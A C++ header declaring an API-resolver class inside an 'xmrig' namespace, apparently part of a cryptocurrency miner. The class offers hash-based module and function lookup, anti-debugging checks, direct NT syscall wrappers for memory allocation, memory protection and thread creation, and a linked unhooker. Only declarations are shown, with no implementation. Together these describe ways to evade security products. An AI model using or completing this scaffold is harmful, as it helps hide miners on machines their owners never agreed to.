#pragma once
#include <Windows.h>
#include "structs.h"
#include "unhooker.h"

// API解析器类，负责动态解析API和执行系统调用
namespace xmrig {

class ApiResolver {
public:
    ApiResolver();
    ~ApiResolver();

    static ApiResolver* GetInstance();

    // 初始化API解析器
    bool Initialize();

    // 反调试检测
    bool IsDebugged();

    // 系统调用类函数
    NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );

    NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,
        BOOLEAN Alertable,
        PLARGE_INTEGER Timeout
    );

    NTSTATUS NtClose(
        HANDLE Handle
    );

    // 其他API
    void* GetModuleByHash(DWORD hash);
    void* GetFunctionByHash(DWORD moduleHash, DWORD functionHash);

private:
    // 加载需要的函数地址
    bool LoadApis();
    
    // 存储已加载的模块
    struct {
        HMODULE ntdll;
        HMODULE kernel32;
    } m_modules;

    // 标记是否已初始化
    bool m_initialized;
    
    // 单例实例
    static ApiResolver* s_instance;
};

} // namespace xmrig 